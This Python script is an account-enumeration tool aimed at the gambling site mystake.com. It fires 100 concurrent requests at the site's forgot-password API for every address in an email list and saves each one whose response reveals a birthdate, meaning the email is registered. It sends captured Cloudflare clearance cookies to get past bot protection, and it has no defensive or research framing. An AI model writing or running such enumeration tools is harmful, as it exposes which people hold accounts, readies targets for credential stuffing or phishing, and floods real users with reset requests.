import concurrent.futures
import requests
import time

out = []
CONNECTIONS = 100
TIMEOUT = 5
import requests


emails = open('emails.txt').read().splitlines()


#emails = open("emails.txt","r")
#emails = emails.readlines()
result = open('mystake_emails.txt','w')

def load_url(email, timeout):
    burp0_url = "https://mystake.com:443/api/profile/forgotpassword"
    burp0_cookies = {"cf_clearance": "reEAkvPTJyrKfQJvxI32CrcGJpvNsbFhv5prU57YKtA-1706572270-1-AelnKuLqJ16PZ6OsibxMy3ad5Eq8byvscXuClmrhslFgNyltssfYSCFyXd+8wZ9Xz6FPvH+zfbtDTedUP800KIk=", "_ga_LGQ41N42MV": "GS1.1.1706572270.5.0.1706572270.0.0.0", "_ga": "GA1.1.557742544.1706229623", "_fbp": "fb.1.1706229623710.907608057", "UserIP": "2E5E42B265BF7058388C026323A1F719", "__cf_bm": "hGHr_vWi3NJvvdhKkD0qeJaImrq7GnuLECj3hQO_eRc-1706572266-1-AWUt2kc2UgH30sEdOGttK7CR6CbumEHMmRS7XJKNundLMGmOIW7ULsfRqO2j8HwMMSIORmE89uiYTVoL3JpznjM="}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "Origin": "https://mystake.com", "Referer": "https://mystake.com/en", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
    burp0_json={"Email": email}
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
    return [email,r.text]

with concurrent.futures.ThreadPoolExecutor(max_workers=CONNECTIONS) as executor:
    future_to_url = (executor.submit(load_url, email, TIMEOUT) for email in emails)
    time1 = time.time()
    i=0
    for future in concurrent.futures.as_completed(future_to_url):
        try:
            data = future.result()
            if 'BIRTHDATE' in data[1]:
                print(data[0])
                result.write(data[0]+"\n")
                result.flush()
        except Exception as exc:
            data = str(type(exc))
       
        finally:
            out.append(data)
          
            print(str(len(out)),end="\r")

    time2 = time.time()
print(f'Took {time2-time1:.2f} s')
